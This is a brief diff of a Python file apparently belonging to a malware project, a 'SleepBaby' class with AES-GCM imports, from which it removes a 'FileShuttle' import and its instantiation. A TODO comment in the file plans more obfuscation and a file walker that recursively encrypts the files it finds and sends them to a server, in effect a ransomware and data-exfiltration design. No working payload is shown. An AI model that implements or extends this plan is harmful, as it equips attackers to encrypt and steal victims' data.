@@ -6,7 +6,7 @@ import base64
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 import os
 import shutil
-from fileshuttle import FileShuttle as fs
+
 
 #TODO: add more obfuscation and encoding to runtime parsing and passing recursively through the sleepbaby class. also add a filewalker method to the sleepbaby class that uses the file shuttle to recursively walk through directories and files, encrypting them with AES-GCM and sending them to the server. 
 class SleepBaby:
@@ -14,7 +14,6 @@ class SleepBaby:
 
     def __init__(self, sleep_time=5):
         self.sleep_time = sleep_time
-        self.fs = fs()
 
     def string_burp(self, length=10):
         """Generates a random string of the specified length, wrapped in newlines."""
